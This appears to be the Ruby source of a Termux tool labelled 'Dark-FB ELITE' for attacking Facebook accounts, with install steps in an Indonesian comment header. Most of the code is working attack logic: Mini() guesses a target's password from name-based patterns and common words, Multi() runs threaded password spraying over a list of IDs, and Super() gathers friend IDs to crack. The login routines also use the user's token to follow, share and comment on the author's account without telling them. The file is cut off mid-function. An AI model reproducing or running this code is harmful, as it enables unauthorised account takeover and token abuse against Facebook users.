=begin

Author -> Rahmat adha
Tool Name -> Facebook
Release -> 2021-05-23 11:35:33 +0800
Languages -> Ruby
Version -> 1.0
License -> MIT LIcense
Github -> github.com/MR-X-Junior/
Whatsapp -> https://wa.me/6285754629509/
Facebook -> www.facebook.com/Anjay.pro098


Cara Install
=============

$ pkg upgrade && pkg update

$ pkg install ruby -y

$ gem install thread

$ gem install requests

$ pkg install git -y

$ git clone https://github.com/MR-X-Junior/Facebook

$ cd Facebook

$ ruby main.rb

DI SARANKAN UNTUK LOGIN MELALUI TOKEN AKSES

JIKA MEMILIH LOGIN MELALUI Email/password DI SARANKAN UNTUK MENGGUNAKAN VPN

=end

$LOAD_PATH.unshift File.expand_path(".", "lib")


require 'requests/sugar'
require 'thread/pool'
require 'io/console'
require 'net/http'
require 'digest'
require 'json'
require 'erb'
require 'uri'
require 'os'

$logo = " \n\033[1;97m█████████\n\033[1;97m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n\033[1;97m█\033[1;91m▼▼▼▼▼ \033[1;97m- _ --_--\033[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n\033[1;97m█ \033[1;97m \033[1;97m_-_-- -_ --__\033[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n\033[1;97m█\033[1;91m▲▲▲▲▲\033[1;97m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mELITE v1.0\n\033[1;97m█████████      \033[1;96m●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n\033[1;97m ██ ██\n\033[1;97m╔════════════════════════════════════════╗\n\033[1;97m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;96mRahmat adha\033[1;97m                 ║\n\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mgithub.com/MR-X-Junior/\033[1;97m     ║\n\033[1;97m║\033[1;93m* \033[1;97mWa      \033[1;91m: \033[1;96m+62 85754629509   \033[1;97m          ║\n\033[1;97m║\033[1;93m* \033[1;97mRuby.   \033[1;91m: \033[1;96m"+ RUBY_VERSION + "\033[0m   \033[1;97m                    ║\n\033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;96m1.0                         \033[1;97m║\n\033[1;97m╚════════════════════════════════════════╝"
$MaxProcess = 30
$limits = 5000

def load()
  for x in [".   ", "..  ", "... ",".... ","\n"]
    $stdout.write("\r\033[92m[!] Please Wait"+x)
    $stdout.flush()
    sleep(1)
  end
end

def tik(teks)
  for x in teks.chars << "\n"
    $stdout.write(x)
    $stdout.flush()
    sleep(0.05)
  end
end

def convert_bytes(num)
  for i in ['B','KB','MB','GB','TB']
    if num < 1024.0
      return "%3.1f %s" % [num, i]
    else
      num /= 1024.0
    end
  end
end

def get(url)
  x = URI(url)
  y = Net::HTTP.get(x)
  return y
end

def login()
  begin
    system('clear')
    puts($logo)
    puts ("║-> \x1b[1;37;40m1. Login Via Id/email/password")
    puts ("║-> \x1b[1;37;40m2. Login Via Token")
    puts ("║-> \x1b[1;37;40m3. Report Bug")
    puts ("║-> \x1b[1;37;40m0. exit")
    print ("╚═\x1b[1;91m▶\x1b[1;97m ")
    log = gets.chomp()
    if log == '1' or log == '01'
      loginpw()
    elsif log == '2' or log == '02'
      loginto()
    elsif log == '3' or log == '03'
      system ('xdg-open https://wa.me/6285754629509/')
      sleep(1.5)
      login()
    elsif log == '0' or log == '00'
      exit()
    else
      puts ("\033[93m[!] Invalid Input")
      sleep(1.5)
      login()
    end
  rescue SocketError
    puts ("\033[91m[!] No Connection")
    exit()
  rescue Errno::ETIMEDOUT
    puts ("\033[93m[!] Connection timed out")
    exit()
  rescue Interrupt
    puts ("\033[91m[!] Exit")
    exit()
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("\033[93m[!] There is an error\n[!] Please Try Again")
  end
end

def loginpw()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[91m[+] \033[92mLOGIN ACCOUNT FACEBOOK \033[91m[+]")
  print ("\033[91m[+] \033[92musername \033[91m: \033[96m")
  id = gets.chomp() ; id = id.tr(" ","")
  print ("\033[91m[+] \033[92mpassword \033[91m: \033[96m")
  pwd = STDIN.noecho(&:gets).chomp()
  puts ("\n")
  load()
  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': id, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pwd, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
  c = Digest::MD5.new
  c.update(a)
  d = c.hexdigest
  b.update({'sig': d})
  uri = URI("https://api.facebook.com/restserver.php")
  uri.query = URI.encode_www_form(b)
  res = Net::HTTP.get_response(uri)
  f = JSON.parse(res.body)
  if f.include? ('access_token')
    x = File.open('login.txt','w')
    x.write(f['access_token'])
    x.close()
    $token = f['access_token']
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LIKE","LOVE","WOW"].sample,"access_token"=>$token})
    puts ("\033[92m[✓] Login Success")
    masuk()
  elsif f.include? ('error_msg') and f['error_msg'].include? ('www.facebook.com')
    puts ("\033[91m[!] \033[93musername \033[91m: \033[97m"+id)
    puts ("\033[91m[!] \033[93mpassword \033[91m: \033[97m"+pwd)
    puts ("\033[91m[!] \033[93mstatus.  \033[91m: \033[91mAccount Has Been Checkpoint")
    exit()
  else
    puts ("\033[91m[!] Login Failed")
    sleep(1.5)
    loginpw()
  end
end

def loginto()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[91m[+] \033[92mLOGIN VIA TOKEN \033[91m[+]")
  print ("\033[91m[+] \033[92mAccess Token \033[91m: \033[97m")
  $token = gets.chomp()
  load()
  x = URI("https://graph.facebook.com/me?access_token=" + $token)
  y = JSON.parse(Net::HTTP.get(x))
  if y.include? ('name')
    a = File.open('login.txt','w')
    a.write($token)
    a.close()
    $name = y['name']
    $id = y['id']
    msg = ["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"]
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>msg.sample,"access_token"=>$token})
    #Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LIKE","LOVE","WOW"].sample,"access_token"=>$token})
    puts ("\033[92m[✓] Login Success")
    sleep(1)
    menu()
  elsif y.include? ('error') and y['error']['code'] == 190
    puts ("\033[93m[!] "+y['error']['message'])
    exit()
  else
    puts ("\033[93m[!] Invalid Access Token")
    sleep(1.9)
    loginto()
  end
end

def masuk()
  begin
    $token = File.read("login.txt")
    x = get("https://graph.facebook.com/me?access_token=" + $token)
    y = JSON.parse(x)
    if y.include? ('id')
      $name = y['name']
      $id = y['id']
      menu()
    elsif y.include? ('error') and y['error']['code'] == 190
      system ('rm -rf login.txt')
      puts ("\033[93m[!] #{y['error']['message']}")
      sleep(0.9)
      login()
    else
      puts (y)
      system ('rm -rf login.txt')
      puts ("\033[91m[!] Invalid Access Token")
      sleep(0.9)
      login()
    end
  rescue SocketError
    puts ("\033[91m[!] No Connection")
    exit()
  rescue Errno::ETIMEDOUT
    puts ("\033[93m[!] Connection timed out")
    exit()
  rescue Errno::ENOENT
    login()
  rescue Interrupt
    puts ("\033[91m[!] Exit")
    exit()
  end
end

def menu()
  system('clear')
  puts ($logo)
  puts ("\033[97m╔══════════════════════════════════════════════════╗")
  puts ("\033[97m║\033[91m[\033[96m✓\033[91m] \033[97mName : \033[92m" + $name + " "*(39 - $name.length()) + "\033[97m║")
  puts ("\033[97m║\033[91m[\033[96m✓\033[91m] \033[97mID.  : \033[92m" + $id + " "*(39 - $id.length()) + "\033[97m║")
  puts ("\033[97m╠══════════════════════════════════════════════════╝")
  puts ("║-> \x1b[1;37;40m1. MyFrofil")
  puts ("║-> \x1b[1;37;40m2. User Information")
  puts ("║-> \x1b[1;37;40m3. Hack Facebook Account")
  puts ("║-> \x1b[1;37;40m4. Bot")
  puts ("║-> \x1b[1;37;40m5. Others")
  puts ("║-> \x1b[1;37;40m6. Feedback")
  puts ("║-> \x1b[1;37;40m7. Update")
  puts ("║-> \x1b[1;37;40m8. Logout")
  puts ("║-> \x1b[1;37;40m0. exit")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  pilih = gets.chomp()
  if pilih == '1' or pilih == '01'
    MyFrofil()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    menu()
  elsif pilih == '2' or pilih == '02'
    Info()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    menu()
  elsif pilih == '3' or pilih == '03'
    Hamker()
  elsif pilih == '4' or pilih == '04'
    Bot()
  elsif pilih == '5' or pilih == '05'
    lain()
  elsif pilih == '6' or pilih == '06'
    system ("xdg-open https://wa.me/6285754629509/")
    sleep(0.9)
  elsif pilih == '7' or pilih == '07'
    update()
  elsif pilih == '8' or pilih == '08'
    print ("Do You Want To Continue? [Y/n] ")
    sure = gets.chomp()
    if sure.downcase == 'y'
      puts ("#{$0} : Deleting File login.txt")
      sleep(0.3)
      begin
        File.delete('login.txt')
        abort ("#{$0} : Successfully Deleting the login.txt file")
      rescue
        puts ("#{$0} : Failed to delete the login.txt file")
      end
    else
      menu()
    end
  elsif pilih == '0' or pilih == '00'
    abort ("\033[91m[!] Exit")
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    menu()
  end
end

def MyFrofil()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  a = get("https://graph.facebook.com/me?access_token=" + $token)
  data = JSON.parse(a)
  abort ("\033[93m[!] #{data['error']['message']}") if data.key? ('error')
  b = get("https://graph.facebook.com/me/subscribers?access_token="+$token)
  c = get("https://graph.facebook.com/me/subscribedto?access_token="+$token)
  d = get ("https://graph.facebook.com/me/friends?access_token="+$token)
  ikuti = JSON.parse(b)['summary']['total_count'].to_s
  mengikuti = JSON.parse(c)['summary']['total_count'].to_s if not JSON.parse(c)['data'].empty?
  mengikuti = "0" if JSON.parse(c)['data'].empty?
  temen = JSON.parse(d)["data"].each {|i| i['id']}.length.to_s if not JSON.parse(d)['data'].empty?
  temen = "0" if JSON.parse(d)['data'].empty?
  puts ("\033[92m[✓] Name : "+data['name'])
  puts ("\033[92m[✓] Id : "+data['id'])
  puts ("\033[92m[✓] Friend : "+temen)
  puts ("\033[92m[✓] Followers : "+ikuti)
  puts ("\033[92m[✓] Following : "+mengikuti)
  puts ("\033[92m[✓] birthday : "+data['birthday']) if data.key? ('birthday')
  puts ("\033[92m[✓] Status : "+data['relationship_status']) if data.key? ('relationship_status')
  puts ("\033[92m[✓] Religion : "+data['religion']) if data.key? ('religion')
  data['interested_in'].each {|i| puts ("\033[92m[✓] Interested in: "+i)} if data.key? ('interested_in')
  puts ("\033[92m[✓] Email : "+data['email']) if data.key? ('email')
  puts ("\033[92m[✓] Phone : "+data['mobile_phone']) if data.key? ('mobile_phone')
  puts ("\033[92m[✓] Location : "+data['location']['name']) if data.key? ('location')
  puts ("\033[92m[✓] Hometown : "+data['hometown']['name']) if data.key? ('hometown')
  data['education'].each {|i| puts ("\033[92m[✓] #{i['type']} : #{i['school']['name']}")} if data.key? ('education')
  data['work'].each {|i| puts ("\033[92m[✓] Work : #{i['employer']['name']}")} if data.key? ('work')
end

def Info()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] User Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get("https://graph.facebook.com/#{id}?access_token=" + $token)
  data = JSON.parse(a)
  if data.key? ("error")
    puts ("\033[93m[!] User Not Found")
  else
    puts ("\033[97m[+] Pleace Wait...")
    puts ("\033[97m═"*52)
    b = get("https://graph.facebook.com/#{id}/subscribers?access_token="+$token)
    c = get("https://graph.facebook.com/#{id}/subscribedto?access_token="+$token)
    d = get ("https://graph.facebook.com/#{id}/friends?access_token="+$token)
    ikuti = JSON.parse(b)['summary']['total_count'].to_s
    mengikuti = JSON.parse(c)['summary']['total_count'].to_s if not JSON.parse(c)['data'].empty?
    mengikuti = "0" if JSON.parse(c)['data'].empty?
    temen = JSON.parse(d)["data"].each {|i| i['id']}.length.to_s if not JSON.parse(d)['data'].empty?
    temen = "0" if JSON.parse(d)['data'].empty?
    puts ("\033[92m[✓] Name : "+data['name'])
    puts ("\033[92m[✓] Id : "+data['id'])
    puts ("\033[92m[✓] Friend : "+temen)
    puts ("\033[92m[✓] Followers : "+ikuti)
    puts ("\033[92m[✓] Following : "+mengikuti)
    puts ("\033[92m[✓] birthday : "+data['birthday']) if data.key? ('birthday')
    puts ("\033[92m[✓] Status : "+data['relationship_status']) if data.key? ('relationship_status')
    puts ("\033[92m[✓] Religion : "+data['religion']) if data.key? ('religion')
    data['interested_in'].each {|i| puts ("\033[92m[✓] Interested in: "+i)} if data.key? ('interested_in')
    puts ("\033[92m[✓] Email : "+data['email']) if data.key? ('email')
    puts ("\033[92m[✓] Phone : "+data['mobile_phone']) if data.key? ('mobile_phone')
    puts ("\033[92m[✓] Location : "+data['location']['name']) if data.key? ('location')
    puts ("\033[92m[✓] Hometown : "+data['hometown']['name']) if data.key? ('hometown')
    data['education'].each {|i| puts ("\033[92m[✓] #{i['type']} : #{i['school']['name']}")} if data.key? ('education')
    data['work'].each {|i| puts ("\033[92m[✓] Work : #{i['employer']['name']}")} if data.key? ('work')
  end
end

def Hamker()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("║-> \x1b[1;37;40m1. Mini Hack Facebook [\033[92mTarget\033[97m]")
  puts ("║-> \x1b[1;37;40m2. Multi Bruteforce Facebook")
  puts ("║-> \x1b[1;37;40m3. Super Multi Bruteforce Facebook")
  puts ("║-> \x1b[1;37;40m4. BruteForce [\033[92mTarget\033[97m]")
  puts ("║-> \x1b[1;37;40m5. Get id/mail/phone")
  puts ("║-> \x1b[1;37;40m0. Back")
  print("╚═\x1b[1;91m▶\x1b[1;97m ")
  hack = gets.chomp()
  if hack == '1' or hack == '01'
    Mini()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Hamker()
  elsif hack == '2' or hack == '02'
    Multi()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Hamker()
  elsif hack == '3' or hack == '03'
    Super()
  elsif hack == '4' or hack == '04'
    Brutal()
  elsif hack == '5' or hack == '05'
    GetMenu()
  elsif hack == '0' or hack == '00'
    menu()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(1.9)
    Hamker()
  end
end

def Mini()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Target Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get('https://graph.facebook.com/' + id + '/?access_token=' + $token)
  b = JSON.parse(a)
  if b.include? ('error') and b['error']['code'] == 190
    puts ("\033[93m[!] "+b['error']['message'])
    sleep (1.5)
    login()
  elsif b.include? ('error')
    puts ("\033[93m[!] User Not Found")
  else
    name = ERB::Util.url_encode(b['name'])
    first = ERB::Util.url_encode(b['first_name'])
    last = ERB::Util.url_encode(b['last_name'])
    puts ("\033[97m[✓] Target Name : "+b['name'])
    puts ("\033[97m[!] CRACK!")
    puts ("\033[97m═"*52)
    pw = name + "123"
    x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    y =  JSON.parse(x)
    if y.include? ('access_token')
      puts ("\033[92m[✓] Success")
      puts ("\033[92m[✓] Name : "+b['name'])
      puts ("\033[92m[✓] username : "+id)
      puts ("\033[92m[✓] password : "+pw)
    elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
      puts ("\033[93m[!] Account Has Been Checkpoint")
      puts ("\033[92m[✓] Name : "+b['name'])
      puts ("\033[92m[✓] username : "+id)
      puts ("\033[92m[✓] password : "+pw)
    else
      pw = name + "12345"
      x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      y =  JSON.parse(x)
      if y.include? ('access_token')
        puts ("\033[92m[✓] Success")
        puts ("\033[92m[✓] Name : "+b['name'])
        puts ("\033[92m[✓] username : "+id)
        puts ("\033[92m[✓] password : "+pw)
      elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
        puts ("\033[93m[!] Account Has Been Checkpoint")
        puts ("\033[92m[✓] Name : "+b['name'])
        puts ("\033[92m[✓] username : "+id)
        puts ("\033[92m[✓] password : "+pw)
      else
        pw = first + "123"
        x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        y = JSON.parse(x)
        if y.include? ('access_token')
          puts ("\033[92m[✓] Success")
          puts ("\033[92m[✓] Name : "+b['name'])
          puts ("\033[92m[✓] username : "+id)
          puts ("\033[92m[✓] password : "+pw)
        elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
          puts ("\033[93m[!] Account Has Been Checkpoint")
          puts ("\033[92m[✓] Name : "+b['name'])
          puts ("\033[92m[✓] username : "+id)
          puts ("\033[92m[✓] password : "+pw)
        else
          pw = first + "12345"
          x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
          y = JSON.parse(x)
          if y.include? ('access_token')
            puts ("\033[92m[✓] Success")
            puts ("\033[92m[✓] Name : "+b['name'])
            puts ("\033[92m[✓] username : "+id)
            puts ("\033[92m[✓] password : "+pw)
          elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
            puts ("\033[93m[!] Account Has Been Checkpoint")
            puts ("\033[92m[✓] Name : "+b['name'])
            puts ("\033[92m[✓] username : "+id)
            puts ("\033[92m[✓] password : "+pw)
          else
            pw = last + "123"
            x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = JSON.parse(x)
            if y.include? ('access_token')
              puts ("\033[92m[✓] Success")
              puts ("\033[92m[✓] Name : "+b['name'])
              puts ("\033[92m[✓] username : "+id)
              puts ("\033[92m[✓] password : "+pw)
            elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
              puts ("\033[93m[!] Account Has Been Checkpoint")
              puts ("\033[92m[✓] Name : "+b['name'])
              puts ("\033[92m[✓] username : "+id)
              puts ("\033[92m[✓] password : "+pw)
            else
              pw = last + "12345"
              x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
              y = JSON.parse(x)
              if y.include? ('access_token')
                puts ("\033[92m[✓] Success")
                puts ("\033[92m[✓] Name : "+b['name'])
                puts ("\033[92m[✓] username : "+id)
                puts ("\033[92m[✓] password : "+pw)
              elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                puts ("\033[93m[!] Account Has Been Checkpoint")
                puts ("\033[92m[✓] Name : "+b['name'])
                puts ("\033[92m[✓] username : "+id)
                puts ("\033[92m[✓] password : "+pw)
              else
                pw = "Anjing"
                x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = JSON.parse(x)
                if y.include? ('access_token')
                  puts ("\033[92m[✓] Success")
                  puts ("\033[92m[✓] Name : "+b['name'])
                  puts ("\033[92m[✓] username : "+id)
                  puts ("\033[92m[✓] password : "+pw)
                elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                  puts ("\033[93m[!] Account Has Been Checkpoint")
                  puts ("\033[92m[✓] Name : "+b['name'])
                  puts ("\033[92m[✓] username : "+id)
                  puts ("\033[92m[✓] password : "+pw)
                else
                  pw = "Kontol"
                  x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                  y = JSON.parse(x)
                  if y.include? ('access_token')
                    puts ("\033[92m[✓] Success")
                    puts ("\033[92m[✓] Name : "+b['name'])
                    puts ("\033[92m[✓] username : "+id)
                    puts ("\033[92m[✓] password : "+pw)
                  elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                    puts ("\033[93m[!] Account Has Been Checkpoint")
                    puts ("\033[92m[✓] Name : "+b['name'])
                    puts ("\033[92m[✓] username : "+id)
                    puts ("\033[92m[✓] password : "+pw)
                  else
                    pw = "Bangsat"
                    x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = JSON.parse(x)
                    if y.include? ('access_token')
                      puts ("\033[92m[✓] Success")
                      puts ("\033[92m[✓] Name : "+b['name'])
                      puts ("\033[92m[✓] username : "+id)
                      puts ("\033[92m[✓] password : "+pw)
                    elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                      puts ("\033[93m[!] Account Has Been Checkpoint")
                      puts ("\033[92m[✓] Name : "+b['name'])
                      puts ("\033[92m[✓] username : "+id)
                      puts ("\033[92m[✓] password : "+pw)
                    else
                      pw = "Doraemon"
                      x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                      y = JSON.parse(x)
                      if y.include? ('access_token')
                        puts ("\033[92m[✓] Success")
                        puts ("\033[92m[✓] Name : "+b['name'])
                        puts ("\033[92m[✓] username : "+id)
                        puts ("\033[92m[✓] password : "+pw)
                      elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                        puts ("\033[93m[!] Account Has Been Checkpoint")
                        puts ("\033[92m[✓] Name : "+b['name'])
                        puts ("\033[92m[✓] username : "+id)
                        puts ("\033[92m[✓] password : "+pw)
                      else
                        pw = "Sayang"
                        x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = JSON.parse(x)
                        if y.include? ('access_token')
                          puts ("\033[92m[✓] Success")
                          puts ("\033[92m[✓] Name : "+b['name'])
                          puts ("\033[92m[✓] username : "+id)
                          puts ("\033[92m[✓] password : "+pw)
                        elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                          puts ("\033[93m[!] Account Has Been Checkpoint")
                          puts ("\033[92m[✓] Name : "+b['name'])
                          puts ("\033[92m[✓] username : "+id)
                          puts ("\033[92m[✓] password : "+pw)
                        else
                          pw = "Goblok"
                          x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                          y = JSON.parse(x)
                          if y.include? ('access_token')
                            puts ("\033[92m[✓] Success")
                            puts ("\033[92m[✓] Name : "+b['name'])
                            puts ("\033[92m[✓] username : "+id)
                            puts ("\033[92m[✓] password : "+pw)
                          elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                            puts ("\033[93m[!] Account Has Been Checkpoint")
                            puts ("\033[92m[✓] Name : "+b['name'])
                            puts ("\033[92m[✓] username : "+id)
                            puts ("\033[92m[✓] password : "+pw)
                          else
                            pw = "Persija"
                            x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = JSON.parse(x)
                            if y.include? ('access_token')
                              puts ("\033[92m[✓] Success")
                              puts ("\033[92m[✓] Name : "+b['name'])
                              puts ("\033[92m[✓] username : "+id)
                              puts ("\033[92m[✓] password : "+pw)
                            elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                              puts ("\033[93m[!] Account Has Been Checkpoint")
                              puts ("\033[92m[✓] Name : "+b['name'])
                              puts ("\033[92m[✓] username : "+id)
                              puts ("\033[92m[✓] password : "+pw)
                            else
                              puts ("\033[91m[!] Sorry, opening password target failed :(")
                              puts ("\033[91m[!] Try other method.")
                            end 
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end 
        end
      end
    end
  end
end

def Multi()
  $cp = 0
  $ok = 0
  th = []
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] File Id : ")
  files = gets.chomp()
  if File.file? (files)
    buka = File.readlines(files, chomp: true)
    $file = File.open(files)
    print ("\033[97m[+] Password: ")
    $pwd = gets.chomp()
    puts ("\033[97m[+] Total Id: "+buka.length.to_s)
    puts ("\033[97m═"*52)
    40.times{th << Thread.new{crack}}
    th.each(&:join)
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Total OK : "+$ok.to_s)
    puts ("\033[93m[!] Total CP : "+$cp.to_s)
  else
    puts ("\033[93m[!] File Not Found")
  end
end


def crack
  while $file
    begin
      usr = $file.readline.strip
      x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + $pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      y = JSON.parse(x)
      if y.include? ('access_token')
        $ok += 1
        z = File.open("multi.txt","a")
        z.write("%s | %s\n" % [usr,$pwd])
        z.close()
        puts ("\033[92m[OK] %s | %s" % [usr,$pwd])
      elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
        $cp += 1
        z = File.open("multi.txt","a")
        z.write("%s | %s\n" % [usr,$pwd])
        z.close()
        puts ("\033[93m[CP] %s | %s" % [usr,$pwd])
      end
    rescue SocketError
      puts ("\033[91m[!] No Connection")
      sleep(1)
    rescue Errno::ETIMEDOUT
      puts ("\033[93m[!] Connection timed out")
    rescue EOFError
      break
    end
  end
end

def Super()
  $ok = 0
  $cp = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("║-> \x1b[1;37;40m1. Crack from Friends")
  puts ("║-> \x1b[1;37;40m2. Crack from Followers")
  puts ("║-> \x1b[1;37;40m3. Crack from Like")
  puts ("║-> \x1b[1;37;40m4. Crack from Comment")
  puts ("║-> \x1b[1;37;40m5. Crack Friends from Friends")
  puts ("║-> \x1b[1;37;40m6. Crack Followers from Friends")
  puts ("║-> \x1b[1;37;40m0. Back")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  su = gets.chomp()
  if su == '1' or su == '01'
    system ("clear")
    puts ($logo)
    puts ("\033[97m═"*52)
    tik ("\033[97m[+] Pleace Wait")
    x = get("https://graph.facebook.com/me/friends?access_token="+$token)
    y = JSON.parse(x)
    id = y['data'].map {|i| i['id']}
    tik("\033[97m[+] Total Id : "+id.length().to_s)
